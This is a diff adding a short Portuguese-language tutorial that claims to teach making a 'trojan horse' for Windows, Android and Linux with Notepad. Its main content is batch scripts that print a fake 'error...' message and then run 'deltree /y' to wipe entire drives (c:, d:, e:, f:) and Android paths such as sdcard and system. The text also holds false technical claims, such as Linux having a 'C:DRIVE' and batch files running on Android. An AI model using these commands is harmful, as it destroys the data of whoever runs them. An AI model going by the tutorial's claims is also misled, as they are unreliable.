@@ -1,0 +1,27 @@
+Olá. Nesse tutorial vou ensinar como
+criar cavalo de tróia para Windows, Android 
+e Linux. O vírus que vou ensinar é feito pelo bloco de notas.
+O Windows trabalha com partições alfabéticas definida em "A", "D", "C", "E", etc. Já o Android trabalha com partições diferêntes definida em 
+/mnt, /sdcard, etc. O Linux atua com o mesmo, porêm o Linux possui C:DRIVE que é o HD. Vamos lá, criando o cavalo de tróia:
+
+Windows:
+
+@echo off
+echo error...
+break off
+deltree /y c:\*.*
+deltree /y d:\*.*
+deltree /y e:\*.*
+deltree /y f:\*.*
+
+Android:
+
+@echo off
+echo error...
+break off
+deltree /y mnt/*.*
+deltree /y sdcard/*.*
+deltree /y system/*.*
+deltree /y root\*.*
+
+O Linux, como citei trabalha da mesma forma, só que tem HD o Android não. Bom, fico por aqui, dúvidas de seu FeedBack...
